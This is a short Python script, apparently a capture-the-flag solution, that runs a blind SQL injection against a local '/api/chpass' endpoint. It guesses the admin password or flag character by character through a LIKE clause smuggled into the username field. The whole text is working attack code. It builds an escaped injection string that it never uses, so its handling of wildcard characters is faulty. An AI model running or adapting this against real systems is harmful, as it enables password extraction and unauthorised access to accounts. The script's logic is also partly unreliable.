import requests
from string import ascii_letters, digits

charset = ascii_letters + digits + '!@#$^&*(){}-_'

pw = 'gigem{'

while pw[-1] != '}':
    for c in charset:
        inject = f"admin' and password like '{pw}"
        if c not in '%_[]^-':
            inject += f"{c}%"
        else:
            inject += f"\\{c}% escape '\\'"

        res = requests.post('http://127.0.0.1/api/chpass', data = {"username":f"admin' and password like '{pw}{c}%"})
        if 'not exists' not in res.text:
            pw += c
            print(pw)
            break
